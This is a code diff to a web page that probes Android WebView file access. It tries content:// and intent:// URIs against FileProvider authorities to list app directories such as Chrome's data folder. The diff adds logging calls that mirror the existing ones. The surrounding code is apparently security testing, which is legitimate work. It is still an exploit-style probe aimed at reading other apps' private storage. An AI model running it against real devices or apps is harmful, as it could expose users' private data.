@@ -640,6 +640,7 @@ Android/data/com.android.chrome/ - Chrome data
 
         async function attemptFileListing(authority, path) {
             log(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
+            logFileResult(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
             
             // Try different methods to get file listings
             const methods = [
@@ -656,6 +657,7 @@ Android/data/com.android.chrome/ - Chrome data
             for (let i = 0; i < methods.length; i++) {
                 const method = methods[i];
                 log(`[METHOD ${i + 1}] ${method}`, 'info');
+                logFileResult(`[METHOD ${i + 1}] ${method}`, 'info');
                 
                 try {
                     if (method.startsWith('content://')) {
@@ -664,8 +666,10 @@ Android/data/com.android.chrome/ - Chrome data
                         if (response.ok) {
                             const content = await response.text();
                             log(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
+                            logFileResult(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
                         } else {
                             log(`[FAILED] Fetch failed: ${response.status}`, 'error');
+                            logFileResult(`[FAILED] Fetch failed: ${response.status}`, 'error');
                         }
                         
                         // Try XMLHttpRequest
@@ -674,8 +678,10 @@ Android/data/com.android.chrome/ - Chrome data
                         xhr.send();
                         if (xhr.status === 200) {
                             log(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
+                            logFileResult(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
                         } else {
                             log(`[FAILED] XHR failed: ${xhr.status}`, 'error');
+                            logFileResult(`[FAILED] XHR failed: ${xhr.status}`, 'error');
                         }
                     } else if (method.startsWith('intent://')) {
                         // Try intent-based file listing with result capture
@@ -683,6 +689,7 @@ Android/data/com.android.chrome/ - Chrome data
                             // Method 1: Direct intent trigger
                             window.location = method;
                             log(`[SUCCESS] Intent-based file listing triggered`, 'success');
+                            logFileResult(`[SUCCESS] Intent-based file listing triggered`, 'success');
                             
                             // Method 2: Try to capture result through iframe
                             setTimeout(() => {
@@ -774,10 +781,12 @@ Android/data/com.android.chrome/ - Chrome data
                             
                         } catch (error) {
                             log(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
+                            logFileResult(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
                         }
                     }
                 } catch (error) {
                     log(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
+                    logFileResult(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
                 }
                 
                 // Small delay between methods
@@ -787,6 +796,7 @@ Android/data/com.android.chrome/ - Chrome data
 
         function testFileListing() {
             log('Testing File Listing Capabilities...', 'warning');
+            logFileResult('Testing File Listing Capabilities...', 'warning');
             
             const authorities = [
                 "com.reactnativecommunity.webview.RNCWebViewFileProvider",
@@ -808,9 +818,11 @@ Android/data/com.android.chrome/ - Chrome data
             
             authorities.forEach((authority, authIndex) => {
                 log(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
+                logFileResult(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
                 
                 directories.forEach((dir, dirIndex) => {
                     log(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
+                    logFileResult(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
                     
                     // Try multiple file listing methods
                     attemptFileListing(authority, dir);
